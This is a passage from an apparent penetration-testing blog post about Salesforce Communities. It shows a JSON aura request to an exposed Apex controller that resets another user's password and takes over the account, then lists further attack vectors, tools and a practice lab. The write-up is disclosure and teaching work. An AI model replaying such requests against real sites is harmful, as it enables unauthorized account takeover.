Since I was running the tests on production sites, I immediately reached out to the Communities maintainers, explaining to them the issue and the possible critical impacts. They provided me with a sample userID with which I can test the functionality.

Having everything required, I used the descriptor to replicate a valid aura call to the Apex controller `CA_ChangePasswordSettingController`, and finally reset the user's password and took over his account.

```json
{
  "actions": [
    {
      "id": "123;a",
      "descriptor": "apex://CA_ChangePasswordSettingController/ACTION$resetPassword",
      "callingDescriptor": "UNKNOWN",
      "params": {
        "userID": "0056<REDACTED>M",
        "newPassword": "RT-wofnwo2!$4nfi!"
      }
    }
  ]
}
```

![]({{page.screenshots}}salesforce-passwordreset.png)
*User's password successfully reset* 

This vulnerability could have had a *massive* impact. Even though custom controllers are pretty straightforward to find, they are often overlooked during Salesforce penetration tests because not every tester knows this particular attack vector. 


### Other attack vectors and interesting cases

In addition to the permission problems on standard and custom objects, the exposure of custom controllers, and the classic web vulnerabilities like XSS and unsecured APIs, there are other attack vectors that I did not find directly during testing but have read about online and will list below:
- SOQL Injection [^soql-injection-doc] [^soql-injaection-lab] [^soql-injection] [^2nd-order-soqlinjection] and Blind SOQL Injection [^blind-soql] [^soql-subquery-blind]
- ["Without sharing" Apex vulnerability](https://www.varonis.com/blog/apex-code-vulnerabilities#:~:text=Apex%20vulnerabilities), varonis.com
- [Ghost Sites: Stealing Data From Deactivated Salesforce Communities](https://www.varonis.com/blog/salesforce-ghost-sites), varonis.com
- [The Top 20 Vulnerabilities Found in the AppExchange Security Review](https://developer.salesforce.com/blogs/2023/08/the-top-20-vulnerabilities-found-in-the-appexchange-security-review), developer.salesforce.com
- [Undocumented descriptors and endpoints](https://www.varonis.com/blog/abusing-salesforce-communities#:~:text=Other%20undocumented%20endpoints), varonis.com


[^soql-injection-doc]: [SOQL Injection](https://developer.salesforce.com/docs/atlas.en-us.apexcode.meta/apexcode/pages_security_tips_soql_injection.htm), developer.salesforce.com
[^soql-injection]: [SQL Injection Union Based](https://hackerone.com/reports/1046084), hackerone.com
[^2nd-order-soqlinjection]: [Second-order SOQL injection through email and campaign name parameter](https://hackerone.com/reports/1039821), heckerone.com
[^soql-injaection-lab]: [SOQL Injection Lab.](https://infosecwriteups.com/soql-injection-b2c2c624cbbb), infosecwriteups.com
[^blind-soql]: [Blind SOQL Injection](https://appomni.com/ao-labs/lightning-components-a-treatise-on-apex-security-from-an-external-perspective/#:~:text=public%20or%20not.-,Blind%20SOQL%20Injection,-Basic%20SOQL%20injection), appomni.com
[^soql-subquery-blind]: [SOQL subquery blind attack](https://www.varonis.com/blog/manipulating-salesforce-public-links#:~:text=SOQL%20subquery%20blind%20attack%C2%A0), varonis.com 



## Tools and Labs

To facilitate analysis and enumeration, there are a few tools (with their limitations and shortcomings) that can help speed up and automate the work:
- [nuclei](https://github.com/projectdiscovery/nuclei) and salesforce templates [^nuclei-template][^nuclei-template2]
- [poc_salesforce_lightning](https://github.com/moniik/poc_salesforce_lightning)
- [lightning-burp](https://github.com/salesforce/lightning-burp)

> *I have not found other useful tools, but please [let me know]({{site.url}}/about/#contact) if I have missed something!*

If you need a lab to practice with, have a look at the following links:
- [paas-cloud-goat](https://github.com/Coalfire-Research/paas-cloud-goat), Coalfire-Research; github.com


[^nuclei-template]: [salesforce-aura.yaml](https://github.com/projectdiscovery/nuclei-templates/blob/main/http/misconfiguration/salesforce-aura.yaml), github.com
[^nuclei-template2]: [salesforce-misconfiguration.yaml](https://github.com/JoshMorrison99/my-nuceli-templates/blob/main/salesforce-misconfiguration.yaml), github.com
